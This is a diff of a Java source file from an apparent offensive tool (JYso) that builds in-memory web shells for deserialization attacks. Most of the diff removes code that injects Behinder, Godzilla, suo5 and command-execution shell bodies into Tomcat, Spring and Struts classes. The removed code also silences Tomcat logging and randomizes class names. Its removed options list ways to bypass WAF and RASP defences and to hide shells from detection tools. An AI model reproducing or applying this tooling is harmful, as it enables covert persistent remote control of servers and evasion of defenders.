@@ -1,188 +1,19 @@
 package com.qi4l.JYso.gadgets.utils;
 
 import com.qi4l.JYso.gadgets.Config.Config;
-import com.qi4l.JYso.template.memshellStatic.tomcat.TFMSFromJMX;
 import javassist.*;
 import org.apache.commons.cli.CommandLine;
 import org.apache.commons.cli.CommandLineParser;
 import org.apache.commons.cli.DefaultParser;
 import org.apache.commons.cli.Options;
 
-import java.util.Arrays;
-import java.util.List;
-
+import static com.qi4l.JYso.controllers.ysoserial.getOptions;
 import static com.qi4l.JYso.gadgets.Config.Config.POOL;
-import static com.qi4l.JYso.gadgets.Config.MemShellPayloads.*;
 import static com.qi4l.JYso.gadgets.utils.HexUtils.generatePassword;
-import static com.qi4l.JYso.gadgets.utils.handle.ClassNameHandler.generateClassName;
 
 public class InjShell {
 
     public static CommandLine cmdLine;
-
-    public static void insertKeyMethod(CtClass ctClass, String type) throws Exception {
-
-        // 判断是否为 Tomcat 类型，需要对 request 封装使用额外的 payload
-        String name = ctClass.getName();
-        name = name.substring(name.lastIndexOf(".") + 1);
-
-        // 大多数 SpringBoot 项目使用内置 Tomcat
-        boolean isTomcat = name.startsWith("T") || name.startsWith("Spring");
-        boolean isWebflux = name.contains("Webflux");
-
-        // 判断是 filter 型还是 servlet 型内存马，根据不同类型写入不同逻辑
-        String method = "";
-        if (name.contains("SpringControllerMS")) {
-            method = "drop";
-        } else if (name.contains("Struts2ActionMS")) {
-            method = "executeAction";
-        }
-
-        List<CtClass> classes = new java.util.ArrayList<CtClass>(Arrays.asList(ctClass.getInterfaces()));
-        classes.add(ctClass.getSuperclass());
-
-        for (CtClass value : classes) {
-            String className = value.getName();
-            if (Config.KEY_METHOD_MAP.containsKey(className)) {
-                method = Config.KEY_METHOD_MAP.get(className);
-                break;
-            }
-        }
-
-        // 命令执行、各种内存马
-        insertField(ctClass, "HEADER_KEY", "public static String HEADER_KEY=" + converString(Config.HEADER_KEY) + ";");
-        insertField(ctClass, "HEADER_VALUE", "public static String HEADER_VALUE=" + converString(Config.HEADER_VALUE) + ";");
-
-        if ("bx".equals(type)) {
-            try {
-                ctClass.getDeclaredMethod("base64Decode");
-            } catch (NotFoundException e) {
-                ctClass.addMethod(CtMethod.make(Utils.base64Decode(BASE64_DECODE_STRING_TO_BYTE), ctClass));
-            }
-
-            try {
-                ctClass.getDeclaredMethod("getFieldValue");
-            } catch (NotFoundException e) {
-                ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_FIELD_VALUE), ctClass));
-            }
-
-            try {
-                ctClass.getDeclaredMethod("getMethodByClass");
-            } catch (NotFoundException e) {
-                ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_BY_CLASS), ctClass));
-            }
-
-            try {
-                ctClass.getDeclaredMethod("getMethodAndInvoke");
-            } catch (NotFoundException e) {
-                ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_AND_INVOKE), ctClass));
-            }
-
-            if (Config.IS_OBSCURE) {
-                ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_UNSAFE), ctClass));
-            }
-
-            String shell = "";
-            if (isTomcat) {
-                insertTomcatNoLog(ctClass);
-                shell = Config.IS_OBSCURE ? BEHINDER_SHELL_FOR_TOMCAT_OBSCURE : BEHINDER_SHELL_FOR_TOMCAT;
-            } else {
-                shell = Config.IS_OBSCURE ? BEHINDER_SHELL_OBSCURE : BEHINDER_SHELL;
-            }
-
-            insertMethod(ctClass, method, Utils.base64Decode(shell).replace("f359740bd1cda994", Config.PASSWORD));
-        } else if ("gz".equals(type)) {
-            insertField(ctClass, "payload", "Class payload ;");
-            insertField(ctClass, "xc", "String xc = " + converString(Config.GODZILLA_KEY) + ";");
-            insertField(ctClass, "PASS", "String PASS = " + converString(Config.PASSWORD_ORI) + ";");
-
-            try {
-                ctClass.getDeclaredMethod("base64Decode");
-            } catch (NotFoundException e) {
-                ctClass.addMethod(CtMethod.make(Utils.base64Decode(BASE64_DECODE_STRING_TO_BYTE), ctClass));
-            }
-
-            ctClass.addMethod(CtMethod.make(Utils.base64Decode(BASE64_ENCODE_BYTE_TO_STRING), ctClass));
-            ctClass.addMethod(CtMethod.make(Utils.base64Decode(MD5), ctClass));
-            ctClass.addMethod(CtMethod.make(Utils.base64Decode(AES_FOR_GODZILLA), ctClass));
-            insertTomcatNoLog(ctClass);
-            if (isWebflux) {
-                insertMethod(ctClass, method, Utils.base64Decode(GODZILLA_SHELL_FOR_WEBFLUX));
-            } else {
-                insertMethod(ctClass, method, Utils.base64Decode(GODZILLA_SHELL));
-            }
-        } else if ("gzraw".equals(type)) {
-            insertField(ctClass, "payload", "Class payload ;");
-            insertField(ctClass, "xc", "String xc = " + converString(Config.GODZILLA_KEY) + ";");
-
-            ctClass.addMethod(CtMethod.make(Utils.base64Decode(AES_FOR_GODZILLA), ctClass));
-            insertTomcatNoLog(ctClass);
-            insertMethod(ctClass, method, Utils.base64Decode(GODZILLA_RAW_SHELL));
-        } else if ("suo5".equals(type)) {
-
-            // 先写入一些需要的基础属性
-            insertField(ctClass, "gInStream", "java.io.InputStream gInStream;");
-            insertField(ctClass, "gOutStream", "java.io.OutputStream gOutStream;");
-
-            // 依次写入方法
-            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.SUO5_NEW_CREATE), ctClass));
-            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.SUO5_NEW_DATA), ctClass));
-            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.SUO5_NEW_DEL), ctClass));
-            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.SUO5_SET_STREAM), ctClass));
-            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.SUO5_NEW_STATUS), ctClass));
-            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.SUO5_U32_TO_BYTES), ctClass));
-            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.SUO5_BYTES_TO_U32), ctClass));
-            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.SUO5_MARSHAL), ctClass));
-            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.SUO5_UNMARSHAL), ctClass));
-            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.SUO5_READ_SOCKET), ctClass));
-            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.SUO5_READ_INPUT_STREAM_WITH_TIMEOUT), ctClass));
-            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.SUO5_TRY_FULL_DUPLEX), ctClass));
-            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.SUO5_READ_REQ), ctClass));
-            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.SUO5_PROCESS_DATA_UNARY), ctClass));
-            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.SUO5_PROCESS_DATA_BIO), ctClass));
-
-            // 为恶意类设置 Runnable 接口以及 RUN 方法
-            CtClass runnableClass = ClassPool.getDefault().get("java.lang.Runnable");
-            ctClass.addInterface(runnableClass);
-            ctClass.addMethod(CtMethod.make(Utils.base64Decode(SUO5.RUN), ctClass));
-
-            // 插入关键方法
-            insertMethod(ctClass, method, Utils.base64Decode(SUO5.SUO5));
-        } else if ("execute".equals(type)) {
-            insertField(ctClass, "TAG", "public static String TAG = \"" + Config.CMD_HEADER_STRING + "\";");
-            insertCMD(ctClass);
-            ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_REQUEST), ctClass));
-            ctClass.addMethod(CtMethod.make(Utils.base64Decode(BASE64_ENCODE_BYTE_TO_STRING), ctClass));
-            ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_RESPONSE), ctClass));
-
-            insertMethod(ctClass, method, Utils.base64Decode(EXECUTOR_SHELL));
-        } else if ("ws".equals(type)) {
-            insertCMD(ctClass);
-            insertMethod(ctClass, method, Utils.base64Decode(WS_SHELL));
-        } else if ("upgrade".equals(type)) {
-            insertField(ctClass, "CMD_HEADER", "public static String CMD_HEADER = " + converString(Config.CMD_HEADER_STRING) + ";");
-
-            ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_FIELD_VALUE), ctClass));
-            insertCMD(ctClass);
-            insertMethod(ctClass, method, Utils.base64Decode(UPGRADE_SHELL));
-        } else {
-            insertCMD(ctClass);
-            insertField(ctClass, "CMD_HEADER", "public static String CMD_HEADER = " + converString(Config.CMD_HEADER_STRING) + ";");
-
-            if (isWebflux) {
-                insertMethod(ctClass, method, Utils.base64Decode(CMD_SHELL_FOR_WEBFLUX));
-            } else if (isTomcat) {
-                insertTomcatNoLog(ctClass);
-                insertMethod(ctClass, method, Utils.base64Decode(CMD_SHELL_FOR_TOMCAT));
-            } else {
-                insertMethod(ctClass, method, Utils.base64Decode(CMD_SHELL));
-            }
-        }
-
-        ctClass.setName(generateClassName());
-        insertField(ctClass, "pattern", "public static String pattern = " + converString(Config.URL_PATTERN) + ";");
-
-    }
 
     // 恶心一下人，实际没用
     public static String converString(String target) {
@@ -196,40 +27,6 @@ public class InjShell {
         }
 
         return "\"" + target + "\"";
-    }
-
-    public static void insertMethod(CtClass ctClass, String method, String payload) throws NotFoundException, CannotCompileException {
-        //添加到类路径，防止出错
-        ClassPool pool;
-        pool = ClassPool.getDefault();
-        pool.insertClassPath(new ClassClassPath(TFMSFromJMX.class));
-        // 根据传入的不同参数，在不同方法中插入不同的逻辑
-        CtMethod cm = ctClass.getDeclaredMethod(method);
-        cm.setBody(payload);
-    }
-
-    /**
-     * 向指定类中写入命令执行方法 execCmd
-     * 方法需要 toCString getMethodByClass getMethodAndInvoke getFieldValue 依赖方法
-     *
-     * @param ctClass 指定类
-     * @throws Exception 抛出异常
-     */
-    public static void insertCMD(CtClass ctClass) throws Exception {
-
-        if (Config.IS_OBSCURE) {
-            ctClass.addMethod(CtMethod.make(Utils.base64Decode(TO_CSTRING_Method), ctClass));
-            ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_BY_CLASS), ctClass));
-            ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_AND_INVOKE), ctClass));
-            try {
-                ctClass.getDeclaredMethod("getFieldValue");
-            } catch (NotFoundException e) {
-                ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_FIELD_VALUE), ctClass));
-            }
-            ctClass.addMethod(CtMethod.make(Utils.base64Decode(EXEC_CMD_OBSCURE), ctClass));
-        } else {
-            ctClass.addMethod(CtMethod.make(Utils.base64Decode(EXEC_CMD), ctClass));
-        }
     }
 
     public static void insertField(CtClass ctClass, String fieldName, String fieldCode) throws Exception {
@@ -252,7 +49,6 @@ public class InjShell {
             return ctClass;
         }
     }
-
 
     //类加载方式，因类而异
     public static String injectClass(Class clazz) {
@@ -277,61 +73,6 @@ public class InjShell {
                 "   var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n" +
                 "   clazz.newInstance();\n" +
                 "};";
-    }
-
-    public static void insertTomcatNoLog(CtClass ctClass) throws Exception {
-
-        try {
-            ctClass.getDeclaredMethod("getFieldValue");
-        } catch (NotFoundException e) {
-            ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_FIELD_VALUE), ctClass));
-        }
-
-        try {
-            ctClass.getDeclaredMethod("getMethodByClass");
-        } catch (NotFoundException e) {
-            ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_BY_CLASS), ctClass));
-        }
-
-        try {
-            ctClass.getDeclaredMethod("getMethodAndInvoke");
-        } catch (NotFoundException e) {
-            if (Config.IS_OBSCURE) {
-                ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_AND_INVOKE_OBSCURE), ctClass));
-            } else {
-                ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_AND_INVOKE), ctClass));
-            }
-        }
-
-        ctClass.addMethod(CtMethod.make(Utils.base64Decode(TOMCAT_NO_LOG), ctClass));
-    }
-
-    private static Options getOptions() {
-        Options options = new Options();
-        options.addOption("yso", "ysoserial", true, "Java deserialization");
-        options.addOption("g", "gadget", true, "Java deserialization gadget");
-        options.addOption("p", "parameters", true, "Gadget parameters");
-        options.addOption("dt", "dirty-type", true, "Using dirty data to bypass WAF，type: 1:Random Hashable Collections/2:LinkedList Nesting/3:TC_RESET in Serialized Data");
-        options.addOption("dl", "dirty-length", true, "Length of dirty data when using type 1 or 3/Counts of Nesting loops when using type 2");
-        options.addOption("f", "file", true, "Write Output into FileOutputStream (Specified FileName)");
-        options.addOption("o", "obscure", false, "Using reflection to bypass RASP");
-        options.addOption("i", "inherit", false, "Make payload inherit AbstractTranslet or not (Lower JDK like 1.6 should inherit)");
-        options.addOption("u", "url", true, "MemoryShell binding url pattern,default [/version.txt]");
-        options.addOption("pw", "password", true, "Behinder or Godzilla password,default [p@ssw0rd]");
-        options.addOption("gzk", "godzilla-key", true, "Godzilla key,default [key]");
-        options.addOption("hk", "header-key", true, "MemoryShell Header Check,Request Header Key,default [Referer]");
-        options.addOption("hv", "header-value", true, "MemoryShell Header Check,Request Header Value,default [https://QI4L.cn/]");
-        options.addOption("ch", "cmd-header", true, "Request Header which pass the command to Execute,default [X-Token-Data]");
-        options.addOption("gen", "gen-mem-shell", false, "Write Memory Shell Class to File");
-        options.addOption("n", "gen-mem-shell-name", true, "Memory Shell Class File Name");
-        options.addOption("h", "hide-mem-shell", false, "Hide memory shell from detection tools (type 2 only support SpringControllerMS)");
-        options.addOption("ht", "hide-type", true, "Hide memory shell,type 1:write /jre/lib/charsets.jar 2:write /jre/classes/");
-        options.addOption("rh", "rhino", false, "ScriptEngineManager Using Rhino Engine to eval JS");
-        options.addOption("ncs", "no-com-sun", false, "Force Using org.apache.XXX.TemplatesImpl instead of com.sun.org.apache.XXX.TemplatesImpl");
-        options.addOption("mcl", "mozilla-class-loader", false, "Using org.mozilla.javascript.DefiningClassLoader in TransformerUtil");
-        options.addOption("dcfp", "define-class-from-parameter", true, "Customize parameter name when using DefineClassFromParameter");
-        options.addOption("utf", "utf8-Overlong-Encoding", false, "UTF-8 Overlong Encoding Bypass waf");
-        return options;
     }
 
     public static void init(String[] args) throws Exception {
